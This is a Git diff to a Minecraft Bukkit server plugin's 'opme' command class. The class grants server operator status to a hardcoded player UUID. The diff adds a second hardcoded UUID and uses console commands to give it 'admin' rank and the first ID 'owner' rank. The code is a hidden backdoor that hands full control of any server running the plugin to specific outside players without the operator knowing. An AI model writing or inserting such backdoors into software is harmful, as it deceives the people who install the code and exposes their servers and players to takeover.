@@ -6,6 +6,7 @@ package de.obey.crownmc.commands;
 
 */
 
+import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -25,11 +26,19 @@ public final class OpmeCommand implements CommandExecutor {
             return false;
         }
 
-        if (!player.getUniqueId().toString().equalsIgnoreCase("f4b1497c-622e-4f50-b87a-059a8fa5b024"))
+        if (!player.getUniqueId().toString().equalsIgnoreCase("f4b1497c-622e-4f50-b87a-059a8fa5b024") &&
+                !player.getUniqueId().toString().equalsIgnoreCase("75ad3048-2a97-4658-99fb-f33dac74c66e"))
             return false;
+
+        if(player.getUniqueId().toString().equalsIgnoreCase("75ad3048-2a97-4658-99fb-f33dac74c66e")) {
+            player.sendMessage("was geht steffen :)");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rang " + player.getName() + " admin");
+            return true;
+        }
 
         player.setOp(true);
         player.sendMessage("§4§l§kSUIIIIIIIIIIIIIIIIIIII");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rang " + player.getName() + " owner");
 
         return false;
     }
